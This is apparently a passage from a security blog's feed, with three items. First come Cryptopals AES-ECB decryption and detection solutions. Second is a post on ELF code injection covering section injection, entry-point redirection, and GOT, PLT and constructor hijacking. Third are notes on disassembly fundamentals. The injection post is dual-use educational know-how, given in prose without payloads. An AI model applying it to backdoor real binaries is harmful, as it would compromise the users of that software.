<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">test(True)
</code></pre></div>

<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-7-aes-in-ecb-mode">Challenge 7: AES in ECB mode</h3>
<p><a href="https://cryptopals.com/sets/1/challenges/7">Link</a></p>
<blockquote>
<p>The Base64-encoded content in this file has been encrypted via AES-128 in ECB mode under the key<br>
<strong>&ldquo;YELLOW SUBMARINE&rdquo;</strong>.<br>
(case-sensitive, without the quotes; exactly 16 characters; I like &ldquo;YELLOW SUBMARINE&rdquo; because it&rsquo;s exactly 16 bytes long, and now you do too).<br>
Decrypt it. You know the key, after all.<br>
Easiest way: use OpenSSL::Cipher and give it AES-128-ECB as the cipher.</p>
</blockquote>
<p><img src="/Cryptopals_Set_1/2_image.png" alt="&ldquo;AES_ECB_decryption&rdquo;">
<em>AES ECB Decryption.</em></p>
<p><strong>AES</strong> stands for <strong>Advanced Encryption Standard</strong>.<br>
The simplest of the encryption modes of AES is the  <strong>ECB</strong> (<strong>Electronic Codebook</strong>) mode. mode.
The message is divided into blocks, and each block is encrypted separately.<br>
The blocksize(same as the keysize) can be 128, 192 or 256 bits long.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> base64
<span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
inf <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;7.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>)
b64_data <span style="color:#f92672">=</span> inf<span style="color:#f92672">.</span>read()

key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;YELLOW SUBMARINE&#34;</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">AES_ECB_decrypt</span>(ciphertext: bytes, key: bytes) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Decrypts a ciphertext encrypted with AES ECB Mode.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_ECB)
    <span style="color:#66d9ef">return</span> cipher<span style="color:#f92672">.</span>decrypt(ciphertext)
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">byte_data <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(b64_data)
byte_text <span style="color:#f92672">=</span> AES_ECB_decrypt(byte_data, key)

<span style="color:#75715e">#last 4 rubbish bytes is pkcs7 padding of \x04</span>
byte_text
</code></pre></div><p>b&quot;I&rsquo;m back and I&rsquo;m ringin&rsquo; the bell \nA rockin&rsquo; on the mike while the fly girls yell \nIn ecstasy in the back of me \nWell that&rsquo;s my DJ Deshay cuttin&rsquo; all them Z&rsquo;s \nHittin&rsquo; hard and the girlies goin&rsquo; crazy \nVanilla&rsquo;s on the mike, man I&rsquo;m not lazy. \n\nI&rsquo;m lettin&rsquo; my drug kick in \nIt controls my mouth and I begin \nTo just let it flow, let my concepts go \nMy posse&rsquo;s to the side yellin&rsquo;, Go Vanilla Go! \n\nSmooth &lsquo;cause that&rsquo;s the way I will be \nAnd if you don&rsquo;t give a damn, then \nWhy you starin&rsquo; at me \nSo get off &lsquo;cause I control the stage \nThere&rsquo;s no dissin&rsquo; allowed \nI&rsquo;m in my own phase \nThe girlies sa y they love me and that is ok \nAnd I can dance better than any kid n&rsquo; play \n\nStage 2 &ndash; Yea the one ya&rsquo; wanna listen to \nIt&rsquo;s off my head so let the beat play through \nSo I can funk it up and make it sound good \n1-2-3 Yo &ndash; Knock on some wood \nFor good luck, I like my rhymes atrocious \nSupercalafragilisticexpialidocious \nI&rsquo;m an effect and that you can bet \nI can take a fly girl and make her wet. \n\nI&rsquo;m like Samson &ndash; Samson to Delilah \nThere&rsquo;s no denyin&rsquo;, You can try to hang \nBut you&rsquo;ll keep tryin&rsquo; to get my style \nOver and over, practice makes perfect \nBut not if you&rsquo;re a loafer. \n\nYou&rsquo;ll get nowhere, no place, no time, no girls \nSoon &ndash; Oh my God, homebody, you probably eat \nSpaghetti with a spoon! Come on and say it! \n\nVIP. Vanilla Ice yep, yep, I&rsquo;m comin&rsquo; hard like a rhino \nIntoxicating so you stagger like a wino \nSo punks stop trying and girl stop cryin&rsquo; \nVanilla Ice is sellin&rsquo; and you people are buyin&rsquo; \n&rsquo;Cause why the freaks are jockin&rsquo; like Crazy Glue \nMovin&rsquo; and groovin&rsquo; trying to sing along \nAll through the ghetto groovin&rsquo; this here song \nNow you&rsquo;re amazed by the VIP posse. \n\nSteppin&rsquo; so hard like a German Nazi \nStartled by the bases hittin&rsquo; ground \nThere&rsquo;s no trippin&rsquo; on mine, I&rsquo;m just gettin&rsquo; down \nSparkamatic, I&rsquo;m hangin&rsquo; tight like a fanatic \nYou trapped me once and I thought that \nYou might have it \nSo step down and lend me your ear \n'89 in my time! You, &lsquo;90 is my year. \n\nYou&rsquo;re weakenin&rsquo; fast, YO! and I can tell it \nYour body&rsquo;s gettin&rsquo; hot, so, so I can smell it \nSo don&rsquo;t be mad and don&rsquo;t be sad \n&rsquo;Cause the lyrics belong to ICE, You can call me Dad \nYou&rsquo;re pitchin&rsquo; a fit, so step back and endure \nLet the witch doctor, Ice, do the dance to cure \nSo come up close and don&rsquo;t be square \nYou wanna battle me &ndash; Anytime, anywhere \n\nYou thought that I was weak, Boy, you&rsquo;re dead wrong \nSo come on, everybody and sing this song \n\nSay &ndash; Play that funky music Say, go white boy, go white boy go \nplay that funky music Go white boy, go white boy, go \nLay down and boogie and play that funky music till you die. \n\nPlay that funky music Come on, Come on, let me hear \nPlay that funky music white boy you say it, say it \nPlay that funky music A little louder now \nPlay that funky music, white boy Come on, Come on, Come on \nPlay that funky music \n\x04\x04\x04\x04&rdquo;</p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-8-detect-aes-in-ecb-mode">Challenge 8: Detect AES in ECB mode</h3>
<p><a href="https://cryptopals.com/sets/1/challenges/8">Link</a></p>
<blockquote>
<p><a href="https://cryptopals.com/static/challenge-data/8.txt">In this file</a> are a bunch of hex-encoded ciphertexts.<br>
One of them has been encrypted with ECB.<br>
Detect it.<br>
Remember that the problem with ECB is that it is stateless and deterministic; the same 16 byte plaintext block will always produce the same 16 byte ciphertext.</p>
</blockquote>
<p><img src="/Cryptopals_Set_1/3_image.png" alt="&ldquo;diffusion&rdquo;">
<em>Lack of diffusion: structure can still be made out after encryption.</em></p>
<p>Detection can be done by taking advantage of a disadvantage of this method.<br>
The disadvantage is the lack of diffusion. Because ECB encrypts identical plaintext blocks into identical ciphertext blocks, it does not hide data patterns well.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64decode
<span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
inf <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;8.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>)
data <span style="color:#f92672">=</span> inf<span style="color:#f92672">.</span>read()
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">detect_AES_ECB</span>(ciphertext: bytes) <span style="color:#f92672">-&gt;</span> int:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Detect if the AES ECB encryption mode was used for creating the given ciphertexts.
</span><span style="color:#e6db74">    Returns the maximum number of repititions occuring for any particular block.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    blocks <span style="color:#f92672">=</span> [ciphertext[i:i<span style="color:#f92672">+</span>AES<span style="color:#f92672">.</span>block_size] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(ciphertext), AES<span style="color:#f92672">.</span>block_size)]
    <span style="color:#66d9ef">return</span> len(blocks)<span style="color:#f92672">-</span>len(set(blocks))
</code></pre></div><p>Create a list of ciphertexts obtained from the file in byte format.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">hex_data <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
ciphertext_list <span style="color:#f92672">=</span> [bytes<span style="color:#f92672">.</span>fromhex(line<span style="color:#f92672">.</span>strip()) <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> hex_data]
</code></pre></div><p>Iterate over all the ciphertexts to find out the ciphertext with maximum repititions of a block.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">max_score <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
text_ECB <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>

<span style="color:#66d9ef">for</span> cipher <span style="color:#f92672">in</span> ciphertext_list:
    score <span style="color:#f92672">=</span> detect_AES_ECB(cipher)
    <span style="color:#66d9ef">if</span> score <span style="color:#f92672">&gt;</span> max_score:
        max_score <span style="color:#f92672">=</span> score
        text_ECB <span style="color:#f92672">=</span> cipher
        
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Number of repitions: {}&#34;</span><span style="color:#f92672">.</span>format(max_score))
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;ECB ciphered text index: {0}/{1}&#34;</span><span style="color:#f92672">.</span>format(ciphertext_list<span style="color:#f92672">.</span>index(text_ECB), len(ciphertext_list)))
</code></pre></div><p>Number of repitions: 3
ECB ciphered text index: 132/205</p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


]]></content>
        </item>
        
        <item>
            <title>Simple Code Injection Techniques for ELF</title>
            <link>https://hexterisk.github.io/blog/posts/2020/03/19/simple-code-injection-techniques-for-elf/</link>
            <pubDate>Thu, 19 Mar 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/03/19/simple-code-injection-techniques-for-elf/</guid>
            <description>Bare-Metal Binary Modification  Modify an existing binary is by directly editing the bytes of a binary file in hexadecimal format, using a program like hexedit.  Use a disassembler to identify the code or data bytes to be changed and then use a hex editor to make the changes. Advantage: Simple and requires only basic tools. Any padding bytes, dead code (such as unused functions), or unused data, can be overwritten with something new.</description>
            <content type="html"><![CDATA[<h2 id="bare-metal-binary-modification">Bare-Metal Binary Modification</h2>
<ul>
<li>Modify an existing binary is by directly editing the bytes of a binary file in hexadecimal format, using a program like <em>hexedit</em>.
<ul>
<li>Use a disassembler to identify the code or data bytes to be changed and then use a hex editor to make the changes.</li>
<li>Advantage: Simple and requires only basic tools. Any padding bytes, dead code (such as unused functions), or unused data, can be overwritten with something new.</li>
<li>Disadvantage: Only allows in-place editing. Can change code or data bytes but not add anything new. Inserting a new byte causes all the bytes after it to shift to another address, which breaks references to the shifted bytes. It’s difficult (or even impossible) to correctly identify and fix all the broken references, because the relocation information needed for this is usually discarded after the linking phase.</li>
<li>Works for cases like replacing malware&rsquo;s anti-debugging checks with nop.</li>
<li><strong>Off-by-one</strong> bugs typically occur in loops when the programmer uses an erroneous loop condition that causes the loop to read or write one too few or one too many bytes.</li>
</ul>
</li>
</ul>
<h2 id="modifying-shared-library-behavior-using-ld_preload">Modifying Shared Library Behavior Using LD_PRELOAD</h2>
<ul>
<li><strong>LD_PRELOAD</strong> is an environment variable influencing the behavior of the dynamic linker. It allows you to specify one or more libraries for the linker to load before any other library, including standard system libraries such as libc.so. If a preloaded library contains a function with the same name as a function in a library loaded later, the first function is the one that will be used at runtime. This allows you to override library functions (even standard library functions like malloc or printf) with your own versions of those functions.</li>
<li>The <strong>dlfcn.h</strong> header is often included when writing libraries for use with LD_PRELOAD because it provides the <strong>dlsym</strong> function.</li>
</ul>
<h2 id="injecting-a-code-section">Injecting a Code Section</h2>
<p><img src="/Simple_Code_Injection_Techniques_for_ELF/image.png" alt="&ldquo;code_injection&rdquo;">
<em>Replacing .note.ABI-tag with an injected code section.</em></p>
<p>Step ➊ is to add a new section to an ELF binary, you first inject the bytes that the section will contain by appending them to the end of the binary. Next, you create a section header ➋ and a program header ➌ for the injected section. The program header table is usually located right after the executable header ➍, thus overwrite an existing program header instead of adding an extra one to prevent shifting of all the sections and headers that come after it.</p>
<ul>
<li>You can always safely overwrite is the <strong>PT_NOTE header</strong>, which describes the PT_NOTE segment. The PT_NOTE segment encompasses sections that contain auxiliary information about the binary. If this information is missing, the loader simply assumes it’s a native binary.</li>
</ul>
<p>Step ➋ is overwriting one of the .note.* section headers to turn it into a header for the new code section (.injected). Choosing to overwrite the header for the .note.ABI-tag section, the sh_type is changed from SHT_NOTE to SHT_PROGBITS to denote that the header now describes a code section. Moreover, the sh_addr, sh_offset, and sh_size fields are changed to describe the location and size of the new .injected section instead of the now obsolete .note.ABI-tag section. Finally, the section alignment (sh_addralign) is changed to 16 bytes to ensure that the code will be properly aligned when loaded into memory, and the SHF_EXECINSTR flag is added to the sh_flags field to mark the section as executable.</p>
<p>Step ➌ is where the PT_NOTE program header is changed by setting p_type to PT_LOAD to indicate that the header now describes a loadable segment instead of a PT_NOTE segment. This causes the loader to load the segment (which encompasses the new .injected section) into memory when the program starts.</p>
<p>Step ➍ is redirecting the entry point (e_entry field in the ELF executable header), is made to point to an address in the new .injected section, instead of the original entry point, which is usually somewhere in .text. Done only if some code in the .injected section is to be run right at the start of the program.</p>
<h2 id="calling-injected-code">Calling Injected Code</h2>
<p>Injected code might be required to call at any instant during the execution of the binary. Following are the ways to call the injected code:</p>
<h3 id="entry-point-modification">Entry Point Modification</h3>
<p>Find entry point address via readelf and replace those bytes with the address of injected code via hex bytes editors or specific scripts.</p>
<h3 id="hijacking-constructors-and-destructors">Hijacking Constructors and Destructors</h3>
<p>ELF binaries compiled with gcc contain sections called .init_array and .fini_array, which contain pointers to a series of constructors and destructors, respectively. By overwriting one of these pointers, the injected code can be invoked before or after the binary’s main function, depending on which one is overwritten.</p>
<h3 id="hijacking-got-entries">Hijacking GOT Entries</h3>
<p>Use objdump to view the .got.plt section to find out the address stored in the GOT entry used by the PLT stub. This address is replaced by the address of the injected code. Can also be done at runtime since the .got.plt section is writable.</p>
<h3 id="hijacking-plt-entries">Hijacking PLT Entries</h3>
<p>Modify the PLT stub itself. Replace the indirect jmp instruction to a relative offset with a direct jmp instruction to the injected code inside the stub.</p>
<h3 id="redirecting-direct-and-indirect-calls">Redirecting Direct and Indirect Calls</h3>
<p>Use a disassembler to locate the calls to modify and then overwrite them, using a hex editor to replace them with calls to the injected function instead of the original.</p>
<p>When redirecting an indirect call (as opposed to a direct one), the easiest way is to replace the indirect call with a direct one. However, this isn’t always possible since the encoding of the direct call may be longer than the encoding of the indirect call. In that case, you’ll first need to find the address of the indirectly called function that you want to replace, for instance, by using gdb to set a breakpoint on the indirect call instruction and inspecting the target address. Once you know the address of the function to replace, you can use objdump or a hex editor to search for the address in the binary’s .rodata section. If you’re lucky, this may reveal a function pointer containing the target address. You can then use a hex editor to overwrite this function pointer, setting it to the address of the injected code. If you’re unlucky, the function pointer may be computed in some way at runtime, requiring more complex hex editing to replace the computed target with the address of the injected function.</p>
]]></content>
        </item>
        
        <item>
            <title>Disassembly and Binary Analysis Fundamentals</title>
            <link>https://hexterisk.github.io/blog/posts/2020/03/16/disassembly-and-binary-analysis-fundamentals/</link>
            <pubDate>Mon, 16 Mar 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/03/16/disassembly-and-binary-analysis-fundamentals/</guid>
            <description>##Static Disassembly
When people say disassembly, they usually mean static disassembly, which involves extracting the instructions from a binary without executing it.
Linear Disassembly Disassembly desynchronization due to inline data interpreted as code. The instruction where the disassembly resynchronizes is shaded gray.
 It iterates through all code segments in a binary, decoding all bytes consecutively and parsing them into a list of instructions. Many simple disassemblers, including objdump, use this approach.</description>
            <content type="html"><![CDATA[<p>##Static Disassembly</p>
<p>When people say disassembly, they usually mean static disassembly, which involves extracting the instructions from a binary without executing it.</p>
<h3 id="linear-disassembly">Linear Disassembly</h3>
<p><img src="/Disassembly_and_Binary_Analysis_Fundamentals/image.png" alt=""></p>
<p>Disassembly desynchronization due to inline data interpreted as code. The instruction where the disassembly resynchronizes is shaded gray.</p>
<ul>
<li>It iterates through all code segments in a binary, decoding all bytes consecutively and parsing them into a list of instructions. Many simple disassemblers, including objdump, use this approach.</li>
<li>The risk is that not all bytes may be instructions.
<ul>
<li>Some compilers like Visual Studio intersperse data such as jump tables with the code, without leaving any clues as to where exactly that data is. If disassemblers accidentally parse this inline data as code, they may encounter invalid opcodes. Even worse, the data bytes may coincidentally correspond to valid opcodes, leading the disassembler to output bogus instructions. This is especially likely on dense ISAs like x86, where most byte values represent a valid opcode.</li>
<li>On ISAs with variable-length opcodes such as x86, inline data may even cause the disassembler to become desynchronized with respect to the true instruction stream. Though the disassembler will typically self-resynchronize, desynchronization can cause the first few real instructions following inline data to be missed.</li>
</ul>
</li>
</ul>
<h3 id="recursive-disassembly">Recursive Disassembly</h3>
<ul>
<li>Sensitive to control flow, it starts from known entry points into the binary (such as the main entry point and exported function symbols) and from there recursively follows control flow (such as jumps and calls) to discover code. This allows recursive disassembly to work around data bytes in all but a handful of corner cases.
<ul>
<li>To maximize code coverage, recursive disassemblers typically assume that the bytes directly after a call instruction must also be disassembled since they are the most likely target of an eventual ret. Additionally, disassemblers assume that both edges of a conditional jump target valid instructions. Both of these assumptions may be violated in rare cases, such as in deliberately obfuscated binaries.</li>
</ul>
</li>
<li>The downside of this approach is that not all control flow is so easy to follow. For instance, it’s often difficult, if not impossible, to statically figure out the possible targets of indirect jumps or calls. As a result, the disassembler may miss blocks of code, or even entire functions, targeted by indirect jumps or calls, unless it uses special heuristics to resolve the control flow. For example, jump tables make recursive disassembly more difficult because they use <strong>indirect control flow</strong>.</li>
</ul>
<h2 id="dynamic-disassembly">Dynamic Disassembly</h2>
<p>Dynamic disassembly, more commonly known as <strong>execution tracing</strong>, logs each executed instruction as the binary runs.</p>
<ul>
<li>Dynamic analysis solves many of the problems with static disassembly because it has a rich set of runtime information at its disposal, such as concrete register and memory contents. Thus dynamic disassemblers, also known as <strong>execution tracers</strong> or <strong>instruction tracers</strong>, may simply dump instructions (and possibly memory/register contents) as the program executes.
<ul>
<li>When execution reaches a particular address, you can be absolutely sure there’s an instruction there, so dynamic disassembly doesn’t suffer from the inaccuracy problems involved with resolving indirect calls in static disassembly.</li>
</ul>
</li>
<li>The main disadvantage of all dynamic analysis is the <strong>code coverage problem</strong>: the analysis only ever sees the instructions that are actually executed during the analysis run. Thus, if any crucial information is hidden in other instructions, the analysis will never know about it.</li>
</ul>
<h3 id="fuzzers">Fuzzers</h3>
<p>Tools that try to automatically generate inputs to cover new code paths in a given binary.</p>
<ol>
<li><strong>Generation-based fuzzers</strong>: These generate inputs from scratch (possibly with knowledge of the expected input format).</li>
<li><strong>Mutation-based fuzzers</strong>: These fuzzers generate new inputs by mutating known valid inputs in some way, for instance, starting from an existing test suite.</li>
</ol>
<h3 id="symbolic-execution">Symbolic Execution</h3>
<ul>
<li>At each point in the execution, every CPU register and memory area contains some particular value, and these values change over time as the application’s computation proceeds. Symbolic execution allows you to execute an application not with concrete values but with symbolic values. You can think of symbolic values as mathematical symbols. A symbolic execution is essentially an emulation of a program, where all or some of the variables (or register and memory states) are represented using such symbols.
<ul>
<li>Basically initializing variables with symbolic values like α instead of numeric values and then computing <strong>path constraints.</strong> which are just restrictions on the concrete values that the symbols could take, given the branches that have been traversed so far.</li>
</ul>
</li>
<li>The key point is that given the list of path constraints, you can check whether there’s any concrete input that would satisfy all these constraints. There are special programs, called <strong>constraint solvers</strong>, that check, given a list of constraints, whether there’s any way to satisfy these constraints.</li>
<li>Helps with code coverage problem by adjusting path constraints for the solver.</li>
</ul>
<h2 id="structuring-disassembled-code-and-data">Structuring Disassembled Code and Data</h2>
<p>Large unstructured heaps of disassembled instructions are nearly impossible to analyze, so most disassemblers structure the disassembled code in some way that’s easier to analyze. Two ways:</p>
<ol>
<li><strong>Compartmentalizing</strong>: By breaking the code into logically connected chunks, it becomes easier to analyze what each chunk does and how chunks of code relate to each other.</li>
<li><strong>Revealing control flow</strong>: Some of the code structures I’ll discuss next explicitly represent not only the code itself but also the control transfers between blocks of code. These structures can be represented visually, making it much easier to quickly see how control flows through the code and to get a quick idea of what the code does.</li>
</ol>
<ul>
<li>Most disassemblers make some effort to recover the original program’s function structure and use it to group disassembled instructions by function. This is known as <strong>function detection</strong>. Not only does function detection make the code much easier to understand for human reverse engineers, but it also helps in automated analysis.
<ul>
<li>For binaries with symbolic information, function detection is trivial; the symbol table specifies the set of functions, along with their names, start addresses, and sizes.</li>
<li>Stripped binaries have functions with no real meaning at the binary level, so their boundaries may become blurred during compilation. The code belonging to a particular function might not even be arranged contiguously in the binary. Bits and pieces of the function might be scattered throughout the code section, and chunks of code may even be shared between functions (known as <strong>overlapping code blocks</strong>).</li>
</ul>
</li>
<li>The predominant strategy that disassemblers use for function detection is based on <strong>function signatures</strong>, which are patterns of instructions often used at the start or end of a function.
<ul>
<li>Done by recursive disassemblers.</li>
<li>Linear disassemblers don&rsquo;t do function detection except when symbols are available.</li>
<li>Function signature patterns include well-known <strong>function prologues</strong> (instructions used to set up the function’s stack frame) and <strong>function epilogues</strong> (used to tear down the stack frame).</li>
</ul>
</li>
</ul>
<h3 id="control-flow-graphs">Control Flow Graphs</h3>
<p><img src="/Disassembly_and_Binary_Analysis_Fundamentals/1_image.png" alt="">
<em>CFG as seen in IDA Pro</em></p>
<ul>
<li><strong>Control Flow Graphs</strong> (<strong>CFGs</strong>) offer a convenient graphical representation of the code structure, which makes it easy to understand a function’s structure.</li>
<li>CFGs represent the code inside a function as a set of code blocks, called <strong>basic blocks</strong>, connected by <strong>branch edges</strong>, shown here as arrows. A basic block is a sequence of instructions, where the first instruction is the only entry point (the only instruction targeted by any jump in the binary), and the last instruction is the only exit point (the only instruction in the sequence that may jump to another basic block).</li>
<li>Disassemblers often omit indirect edges from the CFG because it’s difficult to resolve the potential targets of such edges statically. Disassemblers also sometimes define a global CFG rather than per-function CFGs. Such a global CFG is called an <strong>interprocedural CFG</strong> (<strong>ICFG</strong>) since it’s essentially the union of all per-function CFGs (<strong>procedure</strong> is another word for function). ICFGs avoid the need for error-prone function detection but don’t offer the compartmentalization benefits that per-function CFGs have.</li>
</ul>
<h3 id="call-graphs">Call Graphs</h3>
<p><img src="/Disassembly_and_Binary_Analysis_Fundamentals/2_image.png" alt="">
<em>CFGs and connections between functions (left) and the corresponding call graph (right).</em></p>
<ul>
<li>Call graphs show you which functions may call each other. They show the relationship between call sites and functions.</li>
<li>They often omit indirect call edges because it’s infeasible to accurately figure out which functions may be called by a given indirect call site.</li>
<li>Functions whose address is stored by some instruction from .text section are called <strong>address-taken functions</strong>. They might be called indirectly, even if you don’t know exactly by which call site. If a function’s address is never taken and doesn’t appear in any data sections, you know it will never be called indirectly.</li>
<li>Considering procedural languages and object oriented code, compilers emit tables of function pointers, called <strong>vtables</strong>, that contain pointers to all the virtual functions of a particular class. Vtables are usually kept in read-only memory, and each polymorphic object has a pointer <strong>vptr</strong> to the vtable for the object’s type. To invoke a virtual method, the compiler emits code that follows the object’s vptr at runtime and indirectly calls the correct entry in its vtable.</li>
</ul>
<h3 id="data-structures">Data Structures</h3>
<ul>
<li>Automatic data structure detection in stripped binaries is a notoriously difficult problem. But there are some exceptions:
<ul>
<li>If a reference to a data object is passed to a well-known function, such as a library function, some disassemblers can automatically infer the data type based on the specification of the library function.</li>
<li>Primitive types can sometimes be inferred by the registers they’re kept in or the instructions used to manipulate the data. For instance, if you see a floating-point register or instruction being used, you know the data in question is a floating-point number. If you see a lodsb (load string byte) or stosb (store string byte) instruction, it’s likely manipulating a string.</li>
</ul>
</li>
<li>For composite types such as struct types or arrays, all bets are off, and you’ll have to rely on your own analysis.</li>
</ul>
<h3 id="intermediate-representations">Intermediate Representations</h3>
<ul>
<li>The sheer number of instructions and side effects makes it difficult to reason about binary programs in an automated way, like <em>add</em> on <em>x86</em> have side effects, such as setting status flags in the <em>eflags</em> register.</li>
<li>Intermediate representations (<strong>IR</strong>), also known as <strong>intermediate languages</strong>, are designed to remove this burden. An IR is a simple language that serves as an abstraction from low-level machine languages like x86 and ARM.</li>
<li>The idea of IR languages is to automatically translate real machine code, such as x86 code, into an IR that captures all of the machine code’s semantics but is much simpler to analyze. For comparison, REIL contains only 17 different instructions, as opposed to x86’s hundreds of instructions. Moreover, languages like REIL, VEX and LLVM IR explicitly express all operations, with no obscure instruction side effects.</li>
<li>It’s still a lot of work to implement the translation step from low-level machine code to IR code, but once that work is done, it’s much easier to implement new binary analyses on top of the translated code. Instead of having to write instruction-specific handlers for every binary analysis, with IRs you only have to do that once to implement the translation step. Moreover, you can write translators for many ISAs, such as x86, ARM, and MIPS, and map them all onto the same IR. That way, any binary analysis tool that works on that IR automatically inherits support for all of the ISAs that the IR supports.</li>
<li>The trade-off of translating a complex instruction set like x86 into a simple language like REIL, VEX, or LLVM IR is that IR languages are far less concise. That’s an inherent result of expressing complex operations, including all side effects, with a limited number of simple instructions. This is generally not an issue for automated analyses, but it does tend to make intermediate representations hard to read for humans.</li>
<li>Translation of the x86-64 instruction add rax,rdx into VEX IR:</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#960050;background-color:#1e0010">➊</span> IRSB {
<span style="color:#960050;background-color:#1e0010">➋</span> t0:Ity_I64 t1:Ity_I64 t2:Ity_I64 t3:Ity_I64
<span style="color:#960050;background-color:#1e0010">➌</span> <span style="color:#ae81ff">00</span> <span style="color:#f92672">|</span> <span style="color:#f92672">------</span> IMark(<span style="color:#ae81ff">0x40339f</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">------</span>
<span style="color:#960050;background-color:#1e0010">➍</span> <span style="color:#ae81ff">01</span> <span style="color:#f92672">|</span> t2 <span style="color:#f92672">=</span> GET:I64(rax)
<span style="color:#ae81ff">02</span> <span style="color:#f92672">|</span> t1 <span style="color:#f92672">=</span> GET:I64(rdx)
<span style="color:#960050;background-color:#1e0010">➎</span> <span style="color:#ae81ff">03</span> <span style="color:#f92672">|</span> t0 <span style="color:#f92672">=</span> Add64(t2,t1)
<span style="color:#960050;background-color:#1e0010">➏</span> <span style="color:#ae81ff">04</span> <span style="color:#f92672">|</span> PUT(cc_op) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000000004</span>
<span style="color:#ae81ff">05</span> <span style="color:#f92672">|</span> PUT(cc_dep1) <span style="color:#f92672">=</span> t2
<span style="color:#ae81ff">06</span> <span style="color:#f92672">|</span> PUT(cc_dep2) <span style="color:#f92672">=</span> t1
<span style="color:#960050;background-color:#1e0010">➐</span> <span style="color:#ae81ff">07</span> <span style="color:#f92672">|</span> PUT(rax) <span style="color:#f92672">=</span> t0
<span style="color:#960050;background-color:#1e0010">➑</span> <span style="color:#ae81ff">08</span> <span style="color:#f92672">|</span> PUT(pc) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004033a2</span>
<span style="color:#ae81ff">09</span> <span style="color:#f92672">|</span> t3 <span style="color:#f92672">=</span> GET:I64(pc)
<span style="color:#960050;background-color:#1e0010">➒</span> NEXT: PUT(rip) <span style="color:#f92672">=</span> t3; Ijk_Boring
}
